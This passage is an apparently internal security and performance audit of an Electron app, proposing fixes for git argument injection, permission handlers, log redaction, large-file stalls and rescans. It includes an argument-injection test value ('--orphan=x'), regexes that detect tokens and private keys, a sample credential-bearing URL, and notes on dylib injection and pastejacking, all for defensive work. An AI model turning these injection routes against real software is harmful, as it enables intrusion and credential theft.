- **Gain:** Removes a whole class of argument-injection and wrong-mode bugs for about ten characters per call.
- **Implementation steps:**
  1. Change the calls to:
     - `['checkout', '--end-of-options', name, '--']`
     - `['checkout', '-b', localName, '--track', '--end-of-options', remoteRef, '--']`
     - `['checkout', '--detach', '--end-of-options', ref, '--']`
     - `['checkout', '-b', name, '--end-of-options', from, '--']`
     - `['merge', '--no-edit', '--end-of-options', ref]`
  2. Apply `assertSafeRefName` to `localName` and `from` as well.
  3. `--end-of-options` needs git 2.24 or later. Add a one-time `git --version` check, or document the minimum.
- **Verification:** Add tests in `tests/unit/branchOps.test.ts` (real git in a temp repo): `checkoutBranch(cwd, '--orphan=x')` rejects with git's "invalid reference" error and creates no orphan branch. `checkoutBranch(cwd, 'README.md')` on a repo with a modified `README.md` rejects and leaves the edit intact.
- **Constraints:** CLAUDE.md: "Git's prose is not an interface". Keep `worktreeForBranch` on `--porcelain` and keep `isWorktreeConflict` as is.

---

#### SEC-10: No permission request or check handler; Electron's default grants every permission request

- **Severity:** low
- **Effort:** S
- **Threat:** compromised renderer, and any future content that gets script execution
- **Evidence:** `grep -rn "setPermissionRequestHandler\|setPermissionCheckHandler" src/main` finds nothing. The renderer only needs the clipboard (`src/renderer/components/TerminalView.tsx:225,338` call `navigator.clipboard.readText()`).
- **What:** Allow `clipboard-read` and `clipboard-sanitized-write` for the app's own URL and deny everything else (media, geolocation, notifications, HID, serial, USB, display-capture, openExternal).
- **Why:** Least privilege. Camera, microphone and screen capture are not features of this app.
- **Gain:** A future renderer bug cannot also turn on the camera.
- **Implementation steps:**
  1. In `app.whenReady()` (`src/main/index.ts:386`), before any window, add `session.defaultSession.setPermissionRequestHandler((wc, perm, cb, details) => cb(isApp(details.requestingUrl) && ALLOWED.has(perm)))` and the matching `setPermissionCheckHandler`. `isApp` uses the same rule as `navigationGuard`.
  2. Also add `setDevicePermissionHandler(() => false)`.
- **Verification:** Run the E2E paste specs (`tests/e2e/*paste*`, `@serial`). Add a unit test of the pure `allowPermission(perm, url)` function.
- **Constraints:** Terminal paste must keep working (see the `terminalPaste.ts` comment).

---

#### SEC-11: Log redaction misses credentials in URLs and several common token shapes

- **Severity:** low
- **Effort:** S
- **Threat:** logs shared with someone else (the whole point of the feature)
- **Evidence:**
  - `src/shared/redact.ts:33-40` covers `sk-`, `gh*_`, `glpat-`, JWT, Bearer/Basic and `key=value`. It has no rule for `scheme://user:password@host` (git remotes and git error text), AWS `AKIA…`, Slack `xox?-`, npm `npm_…` or PEM `-----BEGIN … PRIVATE KEY-----`.
  - Git stderr is logged whole through the IPC wrapper: `src/main/ipc.ts:91` logs `{ channel, ms, error }`, and `branchOps.ts:23` puts `stderr` and `stdout` in `error.message`. A `git fetch` or `push` failure prints the remote URL.
  - The `msg` and `scope` fields are not redacted (`src/main/log/logger.ts:138-143`), and renderer `logWrite` supplies both (`ipc.ts:531-532`).
- **What:** Add the missing patterns and run `msg` and `scope` through `redactString`.
- **Why:** CLAUDE.md says redaction happens in the logger "so it cannot be forgotten". That promise only holds if the rules cover the shapes that reach it.
- **Gain:** A log is safe to attach to an issue.
- **Implementation steps:**
  1. In `SECRETS`, add:
     - `{ pattern: /\b([a-z][a-z0-9+.-]*:\/\/)[^\s/:@]+:[^\s/@]+@/gi, as: '$1[redacted]@' }`
     - `/\bAKIA[0-9A-Z]{16}\b/g`
     - `/\bxox[abposr]-[A-Za-z0-9-]{10,}/g`
     - `/\bnpm_[A-Za-z0-9]{30,}/g`
     - `/-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----/g`
  2. In `Logger.log`, use `scope: redactString(scope, …)` and `msg: redactString(message, …)`, and spread the redacted fields *before* `ts`, `level`, `scope` and `msg` so a field cannot overwrite them.
- **Verification:** Add cases in `tests/unit/redact.test.ts` for each new shape, including `fatal: unable to access 'https://bob:hunter2@gitlab.example/x.git/'`, which must become `https://[redacted]@gitlab.example/...`. `tests/integration/logger.test.ts` asserts that a `fields.msg` cannot override `msg`.
- **Constraints:** Keep the rules narrow (the comment at `redact.ts:29-31` explains why). Conversation content is still never passed to the logger.

---

#### SEC-12: A single huge JSONL, or one huge line, can stall the main process

**Lead review:** Canonical for the search-text cap. MAIN-24 bullet 3 is the same change.

- **Severity:** low
- **Effort:** M
- **Threat:** malicious or merely very large content inside a transcript JSONL (a session that pasted a large file or image)
- **Evidence:**
  - `src/main/search/indexer.ts:37-50` pushes the extracted text of every line into `parts`, then `join`s the lot. Only afterwards does `searchIndex.ts:135` truncate to `MAX_TEXT_PER_SESSION` (2 MB). Indexing runs on the main thread by design (CLAUDE.md "Indexing … is deliberately not a worker thread"), and each line is `JSON.parse`d synchronously in `extractLineText`.
  - `src/main/transcript/transcriptReader.ts:195-226` doubles the read window until it holds more than 200 messages. For a file that is mostly non-message lines, it reads the whole file into a single `Buffer.alloc` and `toString` (`:152-153`).
  - `indexTranscript` (`:41-54`) keeps an unbounded `pending` string for a line with no newline.
- **What:** Stop collecting search text at the 2 MB cap, skip lines above a size limit before parsing, and bound the transcript read window.
- **Why:** A multi-hundred-MB line (a base64 blob, a pasted log) freezes every window while it parses, which is the symptom CLAUDE.md's search-worker section describes.
- **Gain:** A hostile or pathological transcript degrades to "this message is too large to show" instead of a frozen app.
- **Implementation steps:**
  1. In `readSearchText`, track the running length and `break` once it passes `MAX_TEXT_PER_SESSION`. Skip any `line.length > 1_000_000` before `extractLineText`.
  2. In `readTranscriptPage`, cap `byteEnd - byteStart` at, say, 64 MB per iteration and stop widening once the cap is hit, returning what was parsed. Replace lines longer than N MB with a placeholder `TranscriptMessage` (a text block "[message too large to display: X MB]").
  3. In `indexTranscript`, once `pending.length` exceeds the cap, record the offset and drop the buffered text. Only the offsets are needed.
- **Verification:** Add a unit test in `tests/unit/transcriptReader.test.ts` with a generated 50 MB single-line JSONL. `readTranscriptPage` resolves within a set time and returns the placeholder. Add a test that `runIndexPass` on the same file stores 2 MB or less and finishes.
- **Constraints:** The index freshness key stays `(size, mtime)` (CLAUDE.md "Search"). `skippedLines` semantics are unchanged.

---

#### SEC-13: macOS entitlements are broader than Electron needs (this only takes effect once the app is signed)

**Lead review:** Only relevant once a Developer ID exists; parked in Phase 8.

- **Severity:** low
- **Effort:** S
- **Threat:** other local processes (dylib injection into a signed build)
- **Evidence:** `build/entitlements.mac.plist` grants `com.apple.security.cs.allow-unsigned-executable-memory` and `com.apple.security.cs.disable-library-validation`, and is also used as `entitlementsInherit` (`electron-builder.yml`).
- **What:** When the Developer ID arrives (CLAUDE.md "Updating"), drop `allow-unsigned-executable-memory` (current Electron needs only `allow-jit`). Drop `disable-library-validation` too, unless a native module is signed by another team; `better-sqlite3` and `node-pty` are re-signed with the app.
- **Why:** With `disable-library-validation`, a hardened-runtime app still loads any unsigned dylib, for example through `DYLD_INSERT_LIBRARIES` when combined with `allow-dyld-environment-variables`, or through a planted library path.
- **Gain:** The day signing lands, it actually hardens the app.
- **Implementation steps:** Remove the two keys. Build with a signing identity and confirm `codesign -d --entitlements - Apiary.app` shows only `allow-jit`. Launch and run the smoke E2E.
- **Verification:** `npm run test:e2e:smoke` against the signed build, and `spctl -a -vv release/mac-arm64/Apiary.app`.
- **Constraints:** Unsigned builds are unaffected today. Do not let this block a release.

---

### Verified OK

- **Window hardening:** `src/main/index.ts:195-199` sets `contextIsolation: true`, `nodeIntegration: false` and `sandbox: true`. `webSecurity` is left at its default, and there is no `webviewTag`. There is exactly one `new BrowserWindow`, and no `setAsDefaultProtocolClient` or custom protocols.
- **Preload surface:** `src/preload/index.ts` exposes only a typed object. There is no raw `ipcRenderer`, no generic `invoke(channel, …)`, and every channel name comes from `CHANNELS`. Subscriptions strip the `IpcRendererEvent` before calling back.
- **CSP:** it is present in the built `out/renderer/index.html`. `script-src` falls back to `'self'`, there is no `unsafe-eval` or `unsafe-inline` for scripts, and `img-src 'self' data:` blocks remote tracking images from transcripts. Fonts are bundled (`src/renderer/fonts.ts`), so nothing remote is fetched.
- **Navigation:** `navigationGuard.ts` covers `will-navigate` and `setWindowOpenHandler`, always returns `deny` for new windows, and only hands `http:`, `https:` and `mailto:` to the OS. `file:` URLs other than the app page are blocked (SEC-2 tightens the same-page case). `pluginRunAction` (`ipc.ts:429-436`) re-checks the scheme before `openExternal`.
- **Only one HTML sink:** `MarkdownText.tsx` is the only `dangerouslySetInnerHTML`. Tool input and results, thinking, errors, git ref lists, MR titles (`mrRefText.tsx`) and plugin labels are rendered as React text. Release notes are never rendered.
- **No shell injection in spawns:**
  - `buildResumeCommand` validates the session id as a UUID and single-quotes `claudeBin` (`src/main/pty/resumeCommand.ts:1-20`).
  - The theme generator uses `exec "$0" "$@"` with arguments as positional parameters, `--tools ""` and `--safe-mode`, in a `mkdtemp` directory (`themeGenerator.ts:62-81`).
  - `git`, `glab`, `code` and `codesign` all go through `execFile` or `spawn` with `shell: false`.
  - Shell tabs run the fixed `exec "$SHELL" -l`.
  - `claudeRename.sanitizeTitle` strips C0 control characters and DEL before typing `/rename`.
- **Paths from the renderer:**
  - `resolveShellCwd`, `requireFolder`, `newSessionInProject` and `moveSession` all resolve through store rows. `moveSession`'s target name is `encodeProjectDirName`, which cannot contain `/` or `.`.
  - `readImage` resolves before its prefix check, uses an extension allowlist and is confined to `pasted-images`.
  - `saveImage` uses a MIME allowlist, a 20 MB cap and random file names.
  - The only exception is `importSessions` (SEC-8).
- **Background git polling runs only plumbing commands:** `rev-parse`, `rev-list`, `for-each-ref`, `worktree list --porcelain` and `remote get-url`. It never runs `status`, `checkout` or `fetch`, so browsing a hostile repo does not fire hooks or `core.fsmonitor`. Hooks only run on user-clicked checkout, pull or merge, which is expected.
- **SQL:** every query uses `?` placeholders. Migrations are constant `ALTER TABLE` strings. `toMatchQuery` reduces input to `[\p{L}\p{N}]` tokens, each quoted, so FTS `MATCH` cannot be injected, and failures are caught.
- **Themes:** `validateTheme` reads allowlisted own properties only. `themeIpc.ts` type-checks every argument, `ThemeStore.setActive` requires an existing id, `setOptions` clamps, and the renderer only calls `style.setProperty` on allowlisted variables.
- **Transcript images:** `data:` URLs are only ever used as `<img src>` (thumbnail and lightbox). An SVG or odd MIME type cannot run script there.
- **Updater transport:** HTTPS only (`node:https` refuses `http:` redirects), a bounded redirect count, SHA-512 compared, a mismatched file deleted, the install commands are shell-quoted (`capability.ts:65-67`), `autoInstallOnAppQuit = false`, and no GitHub token is held.
- **File permissions:** the observed `~/Library/Application Support/apiary` is `drwx------`, so the `0644` files inside (search.db holds transcript text) are not readable by other users. Chromium creates userData as 0700 on Linux too. `~/.claude/projects` is only written by `moveSession`.
- **Logger:** off by default. It redacts inside `log()`, truncates at 512 characters, and never passes conversation text. Every entry point swallows its own errors.
- **Environment passed to children:** `childEnv` strips the listed Claude markers and nothing else, as CLAUDE.md intends.
- **Production dependencies:** `npm audit --omit=dev` reports 0. dompurify 3.4.14 and marked 15 are current.
- **CI:** `ci.yml` is `permissions: contents: read`.
- **Linux `chrome-sandbox` 4755:** the reasoning in `build/linux-after-install.sh` is correct and is the standard Electron fix.
- **DevTools menu item in production** (`src/main/menu.ts:91`): a local user opening devtools on their own app is not a trust boundary. Keeping it is fine.

### Top 5 by priority

1. **SEC-1:** Upgrade Electron off the unsupported 38 line, and stop `npm audit --omit=dev` hiding it. A Chromium bug reached through a hostile transcript becomes code execution.
2. **SEC-2:** Lock DOMPurify to markdown-only tags and absolute http(s)/mailto links, add `form-action`/`base-uri` to the CSP, and make the navigation guard compare the full URL. This is the realistic transcript-to-action path today, and it is small.
3. **SEC-4 together with SEC-5:** Take the write token away from `npm ci` in the release workflow and pin actions by SHA, then sign the update metadata. Today a single supply-chain or account compromise can ship an update to every install.
4. **SEC-3:** Ignore `APIARY_*` and `ELECTRON_RENDERER_URL` in packaged builds, and flip the Electron fuses (with electron-builder 26, which also fixes the AppImage advisory).
5. **SEC-6:** Remove bracketed-paste terminators from pasted text in `sendPrompt` and `pasteText`. It is a one-file fix for a pastejacking route that reaches a shell and Claude's `!` bash mode.

## Part B: Main process, preload and IPC

Scope: `src/main/**`, `src/preload/index.ts`, `src/shared/api.ts`, `src/shared/types.ts`. I read every file in that scope, CLAUDE.md in full, and the tests/renderer code where main-process design pushes something onto them. `npm run typecheck` passes on the current tree (baseline). I changed no files.

### Current architecture

- **`index.ts` (597 lines)** is the entry point and the de facto composition root, inside `app.whenReady()` (`index.ts:386-515`). It reads 10 `APIARY_*` test overrides inline, builds `AppService`, `UpdateService` (plus its fake backend), `ThemeStore`/`ThemeGenerator`, `SessionLayoutStore`, `LayoutFlushCoordinator` and `TabRegistry`, and then calls `registerIpc(...)` with 11 positional arguments. It also owns window creation and geometry, the window-number↔webContents map, `mainWindow` focus tracking, the periodic-rescan timer, the menu wiring, and the `before-quit`/`shutdown()` orchestration. State lives in about 12 module-level `let` globals (`service`, `mainWindow`, `updater`, `tabRegistry`, `sessionLayoutStore`, `autoImportTimer`, `quitting`, …).
- **`appService.ts` (1,103 lines; 57 public methods, 12 private)** is a second composition root. It constructs its own `PtyManager` (`:91`, `readonly pty = new PtyManager()`), `SessionStore` (`:117`), `PluginRegistry` plus the GitLab plugin (`:123-127`), and lazily `SearchIndex`/`SearchClient`. It owns the refresh loop (scan → resolve → sync → live → auto-import → index), search and notes, session CRUD, transcripts, every pty spawn (resume, fork, new, shells, prompt delivery), 14 one-line git delegations, GitLab MR refs, VS Code, pasted images, settings mutators and disposal.
- **`ipc.ts` (697 lines)** registers 66 `handle()` channels and 6 `ipcMain.on` channels. It also does work that is not IPC: it builds and owns the `ClaudeSessionTracker` (`:504-513`) and the chokidar watcher with its debounce (`:673-686`), coalesces activity broadcasts (`:657-671`), merges and applies settings (`:236-321`), runs cross-window tab-move logic with its own focus-order tracking (`:546-638`), maps DTOs, and applies the "after a mutation, rescan and broadcast" policy (repeated 9 times).
- **`theme/themeIpc.ts`** registers its 10 channels directly on `ipcMain`, bypassing `ipc.ts`'s logging `handle()` wrapper.
- **Leaf modules** are mostly clean and testable: `pty/ptyManager.ts` + `pty/screen.ts`, `store/sessionStore.ts`, `scanner/*`, `git/branchOps.ts` / `worktreeResolver.ts` / `mrStatusCache.ts`, `search/*` (FTS5 in its own DB, with a worker for queries), `plugins/*`, `update/*` (behind an injected `UpdateBackend`), `claudeSessionTracker.ts`, `claudeRename.ts`, `tabRegistry.ts`, `sessionLayoutStore.ts`, `layoutFlushCoordinator.ts`, `settings.ts`, `log/*`.
- **Wiring styles are mixed:**
  - constructor option bags with callbacks (`AppServiceOptions.onPluginsChanged`/`onIndexUpdated`, `UpdateServiceOptions`);
  - module singletons (`log`, plus the resolver cache in `worktreeResolver.ts:8`, the MR cache in `mrStatusCache.ts:30-33` and the transcript cache in `transcriptReader.ts:18`);
  - module-level globals in `index.ts`;
  - `BrowserWindow.getAllWindows()` used as a global event bus in 6 separate loops (`ipc.ts:107`, `index.ts:379,437,442`, `themeIpc.ts:26`, `ipc.ts:558`), plus 5 sends that go to `mainWindow` only.
- **Dependency direction today:** `index.ts` → `ipc.ts` → `AppService` → leaves. `ipc.ts` reaches through `service.pty.*` 17 times. `AppService` imports no Electron (good), but it hardcodes the GitLab plugin and `~/.claude/projects`.
- **The IPC contract has 99 channels:**
  - renderer→main: 74 invoke, 7 send and 1 `sendSync`;
  - main→renderer: 17 event channels.

  Each one is written by hand in `CHANNELS` + `ApiaryApi` (`shared/api.ts`), the preload bridge (`preload/index.ts`), a main handler (`ipc.ts` or `themeIpc.ts`) and the component-test fake (`tests/component/fakeApiary.ts`). The main handler's parameter types are not linked to `ApiaryApi` at all.

---

### Findings

#### MAIN-1: A watcher event triggers a full-library rescan: every JSONL re-read and every folder re-resolved with git

- **Category:** performance
- **Severity:** high
- **Effort:** M
- **Evidence:**
  - `ipc.ts:675-686`: any `add`/`change`/`unlink` under `projects/` (depth 2) → 1s debounce → `service.refresh()`.
  - `appService.ts:258-259`: every pass calls `clearResolverCache()` and then `scanProjects(projectsDir(...))`.
  - `sessionScanner.ts:98-124`: every `.jsonl` in every folder, sequentially. Per file, `extractMeta` (`:63-66`) does a `stat` plus `readHeadLines` and `readTailLines`, each of which opens the file and reads up to 64 KB (`boundaryRead.ts:3,10-16`); then it `JSON.parse`s every line of both chunks (`:8-19`). That is up to **128 KB read and parsed per session, per pass, on the main thread**. For 1,000 sessions that is about 128 MB of reads and JSON parsing per watcher event.
  - `appService.ts:284-291`: `resolveProject` for every distinct cwd, sequentially. `worktreeResolver.ts:45-52` spawns **3 git processes per folder**, and the cache was just cleared. The code's own measurement is `appService.ts:260-261`: "a library of a few hundred folders measured ~35s".
  - `appService.ts:294-299`: every row is upserted again, changed or not (see MAIN-2).
  - `appService.ts:311`: then an index pass that stats every visible session and re-syncs every note (MAIN-7).
  - While Claude is writing, a new event lands after every pause of at least 500 ms (`awaitWriteFinish` at `ipc.ts:678`). `refresh()` then sets `pendingRefresh` and chains another full pass (`appService.ts:246-252`). **On a large library the app is effectively always rescanning while any session is active.**
- **What:** Make the rescan incremental without changing what ends up in the store.
  1. **Skip unchanged files.** The store already holds `file_size`/`file_mtime_ms` per session (`schema.ts:26-27`). `scanProjects` takes an `isUnchanged(path, size, mtimeMs)` predicate and calls `extractMeta` only for new or changed files. The search indexer already works this way (`indexer.ts:86-89`).
  2. **Scope watcher passes to what changed.** chokidar passes the changed path. Collect the paths during the debounce window and call `service.refresh({ paths })`, which re-extracts only those files and re-resolves only their cwds.
  3. **Keep the resolver's structural answers across watcher passes.** `repoRoot`/`isWorktree` for a folder do not change between passes. Clear the whole resolver cache only on an explicit Refresh (button, menu, IPC `refresh`). On a scoped pass, re-resolve only the cwds of changed sessions, which also keeps the branch fresh for the folder being worked in.
  4. Parallelise the remaining `resolveProject` calls with a small concurrency cap (e.g. 8).
- **Why:** This is the largest source of main-thread CPU, disk I/O and process spawning in the app. It grows with library size, not with how much changed. The main thread also routes window input: CLAUDE.md's search section describes this same failure mode for FTS.
- **Gain:** A watcher-triggered pass drops from O(all sessions + 3×all folders git spawns) to O(changed files + their folders): typically one file and three spawns. Refresh latency drops, and so does the latency of every IPC call that awaits a refresh (MAIN-4).
- **Implementation steps:**
  1. **Measure first (CLAUDE.md "Measure before fixing").** Add `log.info('refresh', 'pass', { files, parsed, folders, gitSpawns, ms })` at the end of `runRefresh`. Record numbers on the maintainer's real library.
  2. Add `SessionStore.fileStamps(): Map<string, {size:number; mtimeMs:number}>` (one `SELECT file_path, file_size, file_mtime_ms FROM session`).
  3. Give `scanProjects(root, opts?: { isUnchanged?(path, size, mtimeMs): boolean })` a `stat` before `extractMeta`, and skip the file when `isUnchanged` returns true. Keep the default behaviour (no predicate) so `sessionScanner.test.ts` stays valid.
  4. In `runRefresh`, pass the predicate. Unchanged sessions produce no `SessionMeta`, so their projects are neither re-synced nor re-resolved on a scoped pass.
  5. Add `refresh(opts?: { full?: boolean; paths?: string[] })`. `full` (explicit Refresh, menu, IPC `refresh`) keeps today's behaviour for resolution: re-resolve every distinct cwd from `store` (add `SessionStore.distinctCwds()`), but still skip re-reading unchanged files. The watcher passes `paths`. Keep the `pendingRefresh` join semantics: the pending rerun becomes the union of the pending path sets, or `full` if any caller asked for it.
  6. Move `clearResolverCache()` into the `full` branch only.
  7. Replace the sequential `for…await` at `:284-291` with a bounded-concurrency map.
- **Verification:**
  - `npm test`: `appService.test.ts` refresh tests, `sessionScanner.test.ts`, `worktreeResolver.test.ts`.
  - New integration test: "a rescan in which no transcript changed opens no transcript" (inject the scanner, or count `extractMeta` calls through an injected `readHead`).
  - New integration test: "a transcript appended to is re-read on the next scoped pass, and its title updates".
  - `npm run test:e2e -- sessionFollowing newSession import renameSession moveSession` (the watcher-driven specs).
  - Compare the step-1 log line before and after on the real library.
- **Constraints:**
  - The `syncSessions()` upsert must keep omitting `cwd_override`/`project_path` (CLAUDE.md "cwd override column").
  - cwd still comes from inside the JSONL, never from the directory name.
  - `refresh()` must stay reentrancy-safe and must still stop at each `disposed` check (`appService.ts:266-303`; the quit-during-rescan test).
  - Indexing stays on the main thread by design (CLAUDE.md Search).
- **Depends on:** none. MAIN-2 and MAIN-3 compound it.

#### MAIN-2: Each refresh commits two fsync'ing transactions per project on the main thread, and re-upserts unchanged rows

- **Category:** performance
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - `appService.ts:294-299` calls `store.syncProject(info)` and `store.syncSessions(...)` per project. `syncProject` is an autocommit `INSERT … ON CONFLICT` (`sessionStore.ts:98-114`). `syncSessions` opens its own transaction (`:144-163`) and also re-prepares its statement on every call (`:118-142`).
  - The store DB sets only `PRAGMA journal_mode = WAL` (`schema.ts:2`), so `synchronous` is SQLite's default FULL. For P projects that is **2P commits, each with a WAL fsync, synchronously on the main thread**, every pass. At P = 300 that is about 600 fsyncs.
  - Every call site re-prepares its statement (`getSession` `:223-225`, `setImported` `:236`, …).
- **What:**
  - Wrap the whole write phase of `runRefresh` in a single `db.transaction(...)` by adding `SessionStore.syncAll(entries: {info: ProjectInfo; metas: SessionMeta[]}[])`, so each pass costs one commit.
  - Prepare the hot statements once in the constructor (`getSession`, `getProject`, the upserts).
  - Keep `synchronous` at FULL for the store. The comment at `searchIndex.ts:84-86` records that NORMAL is acceptable for the rebuildable index but not for the session store. Cutting the number of commits gets the win without touching that decision.
- **Why:** better-sqlite3 blocks the thread for each commit's fsync. Fewer commits means less main-thread blocking.
- **Gain:** Per-pass store cost goes from 2P fsyncs to 1. Statement preparation stops showing up on the IPC paths that call `getSession`, which is most of them (via `requireSession`).
- **Implementation steps:**
  1. Add `syncAll` to `SessionStore`, implemented with the existing statements inside one `this.db.transaction`.
  2. Move the statements into private readonly fields built in the constructor, after `migrate()`.
  3. In `runRefresh`, collect `[info, list]` pairs in the existing loop and call `syncAll` once. Keep the `disposed` check before it.
  4. Leave `syncProject`/`syncSessions` public for the other callers (`moveSession`, `newSessionInFolder`, tests).
- **Verification:** `npm test` (`sessionStore.test.ts`, `appService.test.ts`); add a test that "a refresh that fails half-way leaves no partial project rows" (throw from a stubbed `SessionMeta`); `npm run test:e2e -- moveSession import`.
- **Constraints:** Keep the column list and conflict clause exactly as they are (`cwd_override`, `project_path` untouched). Keep FULL durability.
- **Depends on:** none (pairs with MAIN-1).

#### MAIN-3: `resolveProject` spawns three sequential git processes per folder

- **Category:** performance
- **Severity:** medium
- **Effort:** S
- **Evidence:** `worktreeResolver.ts:45-52` runs three separate `run('git', …)` calls in sequence per folder: `rev-parse --git-common-dir`, then `rev-parse --show-toplevel`, then `rev-parse --abbrev-ref HEAD`.
- **What:** Get the first two answers from one spawn: `git rev-parse --git-common-dir --show-toplevel` prints two lines. Get the branch with `git symbolic-ref -q --short HEAD`, which also works on an unborn branch; a detached HEAD exits 1, which maps to `branch: null` exactly as today. That is 2 spawns instead of 3. A single `rev-parse --git-common-dir --show-toplevel --abbrev-ref HEAD` would be 1 spawn, but it fails outright on an unborn HEAD and would then misclassify a fresh repository as "not a repo". Only use it with a fallback to the two-spawn path.
- **Why:** Resolution is the dominant cost of a full refresh, per the code's own ~35 s measurement.
- **Gain:** About 33% fewer spawns per full refresh with the safe variant. Combined with MAIN-1's concurrency, full-refresh wall time should drop sharply; measure it, don't assume.
- **Implementation steps:**
  1. Replace the two `rev-parse` calls with one and split its stdout on `\n`.
  2. Replace the branch call with `symbolic-ref -q --short HEAD`, mapping failure to `null`.
  3. Keep the `commonDir && topLevel` guard and the `isWorktree` computation byte-for-byte.
- **Verification:** `npm test` (`worktreeResolver.test.ts` covers real repos, worktrees and symlinks); add cases for "a repository with no commits yet is still a repository" and "a detached HEAD has no branch"; `npm run test:e2e -- sidebarBranch sidebarFolders allWorktrees`.
- **Constraints:** Canonicalisation with `realpath` stays. Paths still come from git's porcelain-style output, never from prose.
- **Depends on:** none.

#### MAIN-4: Git mutations wait for a full-library rescan before replying; the "rescan and broadcast" step is pasted 9 times

- **Category:** performance / modularity
- **Severity:** high
- **Effort:** S
- **Evidence:**
  - `ipc.ts:339-340, 348-349, 359-360, 365-366, 372-373, 383-384, 394-395, 401-402`, and `moveSession` at `:200-201`: `await service.refresh(); send(CHANNELS.treeChanged)`. For checkout the comment gives the reason: "`tree()` reads the `branch` column, which only `refresh()` … writes" (`:335-337`).
  - So a branch checkout replies to the renderer only after re-scanning every transcript and re-resolving every folder (up to ~35 s, MAIN-1). If a pass is already in flight, `refresh()` joins it and then runs another (`appService.ts:227-230, 246-252`), so the wait can be two full passes.
- **What:** Add `AppService.refreshProject(cwd)`, which runs `resolveProject(cwd)` (bypassing the cache) and then `store.syncProject(info)`. Make the git handlers call it for the affected folder, or for the worktree path for `gitPullWorktree`. `gitFetch`/`gitMerge`/`gitPull` change only ahead/behind, which the tree does not show at all (`buildTree.ts` reads `branch` only), so for those the `treeChanged` broadcast is enough. Put the policy in one place:

  ```ts
  // git/gitService.ts
  async mutate<T>(ref: TerminalRef, op: (cwd: string) => Promise<T>, { branchMayChange }: { branchMayChange: boolean }): Promise<T>
  ```

  It resolves the cwd through the trust boundary, runs `op`, then `refreshProject(cwd)` if `branchMayChange`, then emits `treeChanged`.
- **Why:** User-visible latency on every checkout, create-branch, merge, pull and fetch that grows with library size. The copy-paste also means the next git operation will get this wrong, or right, by chance.
- **Gain:** Git actions answer in git time, not library-scan time. One owner for post-mutation policy.
- **Implementation steps:**
  1. Add `refreshProject(cwd)` to `AppService`, with a `forceResolve` option on `resolveProject` or a `resolveProjectFresh` export.
  2. Add a private `afterGitMutation(cwd, branchMayChange)` in `ipc.ts` and replace the 8 git blocks with it. Leave `moveSession` on a full `refresh()`: it changes which project a session belongs to.
  3. Once MAIN-13 lands, move this into `git/gitService.ts`.
- **Verification:** `npm run test:e2e -- gitToolbar gitMenu sidebarBranch allWorktrees`: the sidebar must still show the new branch after checkout, and the conflict flow must still work. Add an `appService.test.ts` case: "checking out a branch updates the project's branch without rescanning transcripts".
- **Constraints:** The trust boundary (`resolveShellCwd`, `requireWorktreeFor`) must stay. The checkout-conflict path must still resolve worktrees via `worktree list --porcelain` (CLAUDE.md).
- **Depends on:** none. Folds into MAIN-13/14.

#### MAIN-5: The pty replay buffer is dead in production and costs a copy of up to 256 KB on every output chunk

**Lead review:** Re-verified: `grep -rn "\.replay(" src` finds no caller. If `replay()` is removed, fix the CLAUDE.md sentences in the same commit (see DOC-2).

- **Category:** performance
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - `ptyManager.ts:127` calls `this.remember(opts.id, data)` on every chunk. `:175-178` does `const next = (buffer ?? '') + data; … next.length > REPLAY_BYTES ? next.slice(-REPLAY_BYTES) : next`. Once the buffer is full, every chunk flattens and copies about 256 K characters (≈512 KB in UTF-16).
  - `replay()` (`:186-188`) has **no production caller**: grep finds it only in `tests/integration/ptyManager.test.ts:168,183,191`. Late-attaching views use `snapshot()` (CLAUDE.md "Windows, and what belongs to which").
  - A build log producing a few hundred chunks per second therefore burns on the order of 100+ MB/s of memcpy on the main thread for nothing.
- **What:** Either delete the replay buffer (and the three tests that only assert its existence), or, if the maintainer wants to keep `replay()` as documented API (CLAUDE.md line 162 contrasts it with `screen()`), store it as a chunk ring (`string[]` plus a running length, dropping whole chunks from the front) and join only when `replay()` is called.
- **Why:** An unused feature on the hottest path in the main process.
- **Gain:** Removes an O(buffer) copy per chunk and 512 KB of retained memory per pty.
- **Implementation steps:**
  1. Confirm with a repo-wide grep that no renderer or IPC path calls `replay`. There is no `ptyReplay` channel in `CHANNELS`.
  2. Preferred: remove `replayBuffers`, `remember`, `replay`, and the "replaying what a pty already printed" describe block. Update CLAUDE.md lines 88-94 and 159-164 to say `snapshot()` is the only catch-up path.
  3. Alternative: a chunk ring with the same public API; the tests stay unchanged.
- **Verification:** `npm test` (`ptyManager.test.ts`, `screenSnapshot.test.ts`); `npm run test:e2e -- multiWindow detachTab sessionTabs terminal multiTerminal` (the late-attach paths).
- **Constraints:** `snapshot()`/`ScreenBuffers` ordering semantics must not change (CLAUDE.md).
- **Depends on:** none.

#### MAIN-6: A pty that exits by itself leaks its headless xterm and bookkeeping; pty state is spread over 9 parallel maps

**Lead review:** Re-verified: `onExit` (`ptyManager.ts:134-138`) only deletes `processes`.

- **Category:** correctness (memory)
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - The `onExit` handler (`ptyManager.ts:134-138`) only does `this.processes.delete(opts.id)`. `kill()` (`:332-343`) also clears `lastSize`, `cwds`, `replayBuffers` and `screens`, but even `kill()` never clears `expectTui`, `tuiStarted`, `lastDataAt` or `outputCounts` (`:71-75`).
  - A `new:<uuid>` id (`appService.ts:939,960`) is never reused, so every new or forked session whose Claude exits normally leaves behind a headless `Terminal` with 1,000 lines of scrollback (`screen.ts:34,92`). At 200 columns that is roughly 1,040×200 cells, a few MB (estimate), plus a 256 KB replay string, for the life of the app.
  - When a session is respawned under the same id, `spawn()`'s `this.kill(opts.id)` (`:114`) is a no-op because the process is already gone from `processes`. `ScreenBuffers.write` (`screen.ts:88-99`) then reuses the old `Terminal`, so the new process's snapshot carries the previous run's screen and scrollback. That may even be welcome, but it is accidental and differs from the kill path.
- **What:** Replace the parallel maps with one record per pty, and decide the exit semantics explicitly:

  ```ts
  interface PtyEntry {
    child: IPty | null            // null once exited
    cwd: string
    size: { cols: number; rows: number }
    tui: { expected: boolean; started: boolean }
    lastDataAt: number
    outputCount: number
    screen: ScreenBuffer          // one Terminal + SerializeAddon
  }
  private entries = new Map<PtyId, PtyEntry>()
  ```

  On exit: set `child = null`, keep `cwd` (`resolveShellCwd` for a pending id needs it: `appService.ts:656`) and optionally keep the screen for a grace period. Dispose the screen on `spawn` over the id, on `kill`, or after N minutes.
